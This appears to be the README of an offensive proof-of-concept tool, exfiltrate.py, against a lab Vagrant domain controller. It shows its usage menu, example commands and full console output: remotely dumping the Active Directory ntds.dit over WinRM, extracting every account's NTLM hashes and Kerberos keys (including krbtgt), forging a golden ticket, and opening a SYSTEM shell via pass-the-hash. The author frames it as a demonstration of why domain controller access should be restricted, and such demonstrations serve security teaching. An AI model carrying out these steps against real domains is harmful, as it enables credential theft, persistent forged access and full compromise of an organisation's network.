# exfiltrate.py

## Summary

This PoC abuses WinRM to remotely download the active directory database "ntds.dit" and then automates the process of extract
all the hashes and user accounts from it to leverage pass-the-hash attack for full network compromise. In the end of the run
we have all data to forge a golden ticket, so it will also do that to demostrate how that attack can be done.

Note as admin credentials is required this is not a security issue per se, it demostrate more the importance of only let a smal amount of authorized people have access
to the domain controller. It also demostrate how quickly a hole network can be compromised as this takes only a few seconds to finish.

## Golden ticket

A golden ticket attack is one in which you create a Kerberos-generating ticket that is good for 10 years or however long you choose.
You can be anyone (assuming you have their hash), add any account to any group (including highly privileged groups), and for that matter do anything you within Kerberos authentication capabilities. You can even create usable Kerberos tickets for user/computer/service accounts that don't even exist in Active Directory.


## Prerequisite

To test this locally you can bring up a test domain controller with vagrant.

```sh
⬢  active_directory  master ⦿ vagrant up
Bringing machine 'windows-domain-controller' up with 'virtualbox' provider...
==> windows-domain-controller: Cloning VM...
==> windows-domain-controller: Matching MAC address for NAT networking...
==> windows-domain-controller: Setting the name of the VM: active_directory_windows-domain-controller_1543217030501_3374
==> windows-domain-controller: Clearing any previously set network interfaces...
==> windows-domain-controller: Preparing network interfaces based on configuration...
    windows-domain-controller: Adapter 1: nat
    windows-domain-controller: Adapter 2: hostonly
==> windows-domain-controller: Forwarding ports...
    windows-domain-controller: 22 (guest) => 2222 (host) (adapter 1)
==> windows-domain-controller: Running 'pre-boot' VM customizations...
==> windows-domain-controller: Booting VM...
==> windows-domain-controller: Waiting for machine to boot. This may take a few minutes...
    windows-domain-controller: SSH address: 127.0.0.1:2222
    windows-domain-controller: SSH username: vagrant
    windows-domain-controller: SSH auth method: private key
```

Once vagrant image is up and running. We can start run our PoC.
Run the exfiltrate.py to get the usage menu.

```sh
⬢  exfiltration  master ⦿ ./exfiltrate.py

 ▄▄▄      ▓█████▄ ▓█████ ▒██   ██▒  █████▒██▓ ██▓
▒████▄    ▒██▀ ██▌▓█   ▀ ▒▒ █ █ ▒░▓██   ▒▓██▒▓██▒
▒██  ▀█▄  ░██   █▌▒███   ░░  █   ░▒████ ░▒██▒▒██░
░██▄▄▄▄██ ░▓█▄   ▌▒▓█  ▄  ░ █ █ ▒ ░▓█▒  ░░██░▒██░
 ▓█   ▓██▒░▒████▓ ░▒████▒▒██▒ ▒██▒░▒█░   ░██░░██████▒
 ▒▒   ▓▒█░ ▒▒▓  ▒ ░░ ▒░ ░▒▒ ░ ░▓ ░ ▒ ░   ░▓  ░ ▒░▓  ░
  ▒   ▒▒ ░ ░ ▒  ▒  ░ ░  ░░░   ░▒ ░ ░      ▒ ░░ ░ ▒  ░
  ░   ▒    ░ ░  ░    ░    ░    ░   ░ ░    ▒ ░  ░ ░
      ░  ░   ░       ░  ░ ░    ░          ░      ░  ░
           ░
Active Directory exfilitration & shell popping.

<~~~~~~~~~~~~~~~~~~~~~~~[Active Directory]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>

ntds_dump <HOST> <LHOST <USERNAME> <PASSWORD>    *Loot AD database*
ntds_list                                        *List retrieved hashes*

<~~~~~~~~~~~~~~~~~~~~~~~~~[Shell popping]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>

exec      <USER>@<HOST> [commad]     *Execute command with Pass-the-hash*

<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>

EXAMPLES

exfiltrate.py ntds_dump 192.168.56.2 192.168.1.81 vagrant vagrant
exfiltrate.py exec Administrator@192.168.56.2 cmd.exe
exfiltrate.py ntds_list

```

Run the ntds_dump argument to remotely download the active directory database.
Note as this is a demo machine image that run locally and is destroyed there is no risk to
list the hashes here.

```sh
⬢  exfiltration  master ⦿ ./exfiltrate.py ntds_dump 192.168.56.2 10.100.12.XX vagrant vagrant
[✔] lhost = 10.100.12.XX
[✔] mounted shadow_copy
[✔] unmounted shadow_copy
[✔] sucessfully looted ntds.dit into ~/.exfiltrate/ntds.dit
[✔] sucessfully looted SYSTEM into ~/.exfiltrate/SYSTEM
[➜] extract hashes
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[*] Target system bootKey: 0x19ab7a5e19943ad0d54a8258293cbdde
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 8c004a261fea42738c63ef85ba45c10a
[*] Reading and decrypting hashes from /home/nighter/.exfiltrate/ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:89be338353be6c58ca30de2451f79b4a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
sshd:1001:aad3b435b51404eeaad3b435b51404ee:732e01f99444bd4e74e6f80dc8236e38:::
DC$:1002:aad3b435b51404eeaad3b435b51404ee:40a266a332e281c586eebae210ca851f:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb03483ef7ecf5d8b4db641fe734169:::
example.com\john.doe:1105:aad3b435b51404eeaad3b435b51404ee:89be338353be6c58ca30de2451f79b4a:::
example.com\jane.doe:1106:aad3b435b51404eeaad3b435b51404ee:89be338353be6c58ca30de2451f79b4a:::
[*] Kerberos keys from /home/nighter/.exfiltrate/ntds.dit
Administrator:aes256-cts-hmac-sha1-96:78c1369ad0d23ecfdb8b310324f7611abd438007e6b05e0ce2bcbc36cd9e7b0e
Administrator:aes128-cts-hmac-sha1-96:8f02b561b7342eee51327fb1d080154a
Administrator:des-cbc-md5:ad3273f1ab45c4c2
DC$:aes256-cts-hmac-sha1-96:c97f13254c9822019eada8bba0a50e254926a00b78bcf0b30682f84b410f7baa
DC$:aes128-cts-hmac-sha1-96:09010399e28a42072dc54ab9dfccac55
DC$:des-cbc-md5:92044a838acd206e
krbtgt:aes256-cts-hmac-sha1-96:0892cb26a08b03430bed18a317a9c2d7657f95ea0b35590a611ba028b63df318
krbtgt:aes128-cts-hmac-sha1-96:da3316114ad99815116c7eae0247d8e0
krbtgt:des-cbc-md5:f27f0ba16bc88f0d
example.com\john.doe:aes256-cts-hmac-sha1-96:4a0ab3d7958fccd0e9ed1380958e3d15f0f8c0636c5ba798ec8c477c2446455e
example.com\john.doe:aes128-cts-hmac-sha1-96:e5ad54570b5ff04e2bf34b313e0116eb
example.com\john.doe:des-cbc-md5:46231f68b35d3dae
example.com\jane.doe:aes256-cts-hmac-sha1-96:de1694d1095bed14ebff59f18c097bbe6440f6a91758c95128fbf3ca17b3c99f
example.com\jane.doe:aes128-cts-hmac-sha1-96:3a932eb86ab7ddb9578a00176116b8ed
example.com\jane.doe:des-cbc-md5:3283dc299eb580a4
[*] Cleaning up...
[➜] forges a golden_ticket
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for example.com/administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in administrator.ccache
[✔] golden_ticket created in ~/.exfiltrate/administrator.ccache
```

As we now have all hashes from the active directory database, we can now use any account we want and
login and execute commands anywhere. The tools automaticly append the hash for the account you specify
to make the pass-the-hash login more convinient to use.

```sh
⬢  exfiltration  master ⦿ ./exfiltrate.py exec Administrator@192.168.56.2
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[*] Requesting shares on 192.168.56.2.....
[*] Found writable share ADMIN$
[*] Uploading file ZQWJGKBP.exe
[*] Opening SVCManager on 192.168.56.2.....
[*] Creating service ZAfJ on 192.168.56.2.....
[*] Starting service ZAfJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

The generated golden_ticket can be found here. This is a forged kerberos ticket that is forged with the highest privileges from the krbtg account.
Even if an accounts is removed or the password is modified this token will still be valid. So this is very persistent.

```sh
⬢  exfiltration  master ⦿ ls ~/.exfiltrate/administrator.ccache
/home/nighter/.exfiltrate/administrator.ccache
```
